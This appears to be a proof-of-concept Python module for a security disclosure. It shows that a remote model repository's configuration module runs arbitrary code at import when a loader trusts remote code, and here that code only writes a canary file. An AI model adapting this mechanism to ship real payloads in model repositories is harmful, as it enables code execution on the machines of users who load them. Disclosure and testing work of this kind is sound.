"""configuration_npcpy_pwn.py - remote code served by the second repository.

transformers imports this module because the repository's config.json carries
auto_map and the caller passed trust_remote_code=True.  The module body below is
the entire payload: it writes one canary file and nothing else.
"""
import os
from pathlib import Path

_canary = Path(os.environ.get("NPCPY_POC_CANARY_DIR", "work/canary"))
_canary.mkdir(parents=True, exist_ok=True)
(_canary / "01_remote_configuration_imported.txt").write_text(
    "the base-model repository named in adapter_config.json ran this code:\n"
    "  repository: %s\n"
    "  module    : configuration_npcpy_pwn.py\n" % os.environ.get("NPCPY_POC_REPO", "?"),
    encoding="utf-8",
)

from transformers import LlamaConfig


class NpcpyPwnConfig(LlamaConfig):
    model_type = "llama"
